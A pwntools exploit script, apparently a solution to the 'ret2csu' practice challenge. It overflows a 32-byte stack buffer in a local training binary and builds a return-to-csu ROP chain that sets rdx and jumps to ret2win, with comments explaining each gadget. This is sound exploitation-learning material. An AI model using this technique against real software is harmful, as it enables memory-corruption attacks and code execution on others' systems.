#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2csu')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *(0x{exe.symbols.pwnme:x}+154)
continue
'''.format(**locals())

io = start()

# This program has a buffer overflow. The pwnme() function
# calls fgets(buf, 176, stdin), although the buffer is only
# 32 bytes large ...

# We need to call ret2win(), which is easy (no PIE), but we need
# to pass 0xdeadcafebabebeef as a third argument (rdx). There is
# no easy gadget to do that. However, we can go for the return-to-csu
# approach, which allows us to load rdx from the stack.
# Now, gadget2 does not end with a ret, but with a call [rbx*8+r12].
# It is true that we control rbx and r12, but if we wanted to jump
# directly to ret2win, we would need to find a memory location X
# that already contains the address of ret2win (so that we can
# set rbx and r12 in such a way that rbx*8+r12=X). Unfortunately,
# there is no such a memory location, and we do not have gadgets
# to write somewhere the address of ret2win.
# What we can do is to find a memory location X that already contains
# the address of any function that ** does preserve rdx **.
# On return, RIP will go ahead inside __libc_csu_init(), increment
# rbx and compare rbx with rbp to see if we need to exit the loop.
# Then, RIP will execute gadget1 again, and this time we can
# just return to ret2win.

gadget2 = exe.symbols["__libc_csu_init"] + 0x40
gadget1 = exe.symbols["__libc_csu_init"] + 0x5a

# The .dynamic section contains a memory location X that contains
# a pointer to _init() (and another for _fini()).
# Luckily, for this executable _init() does nothing and does
# preserve rdx. So we can make the indirect call in gadget2 refer to
# X.
addrof_pointer_to_init = 0x600e38

# Wait for the prompt.
msg = io.recvuntil("> ")
print(msg)

# Build the input vector as 40 arbitrary bytes plus the ROP chain,
# that will overwrite the saved RIP.
vector = "B" * 40

# Use the gadget1 to: (1) load rbx with 0 and r12 with
# addrof_pointer_to_init in such a way that
# r12+rbx*8 == addrof_pointer_to_init, and so that the indirect call
# calls _init() ; (2) load r15 with 0xdeadcafebabebeef;
# (3) load 1 in rbp, so that the loop break after the indirect call
# (in gadget2) returns. Values for r13 and r14 are irrelevant.
vector += p64(gadget1)
vector += p64(0)                        # rbx
vector += p64(1)                        # rbp
vector += p64(addrof_pointer_to_init)   # r12
vector += p64(0)                        # r13
vector += p64(0)                        # r14
vector += p64(0xdeadcafebabebeef)       # r15

# Use gadget2 to copy r15 to rdx and call _init(), which preserves
# rdx.
vector += p64(gadget2)

# RIP returns from the indirect call to _init(), increments rbx (to 1)
# and compares rbx with rbp (1). Since they are equal, RIP exits the loop
# and ends up again in gadget1 (modulo 'add rsp, 8'. We need to provide
# further arguments for these pop operations (plus the 'add rsp, 8'),
# but this time values are irrelevant.
for i in range(7):
    vector += p64(0)

# Now return to ret2win
vector += p64(exe.symbols["ret2win"])

io.sendline(vector)
io.interactive()
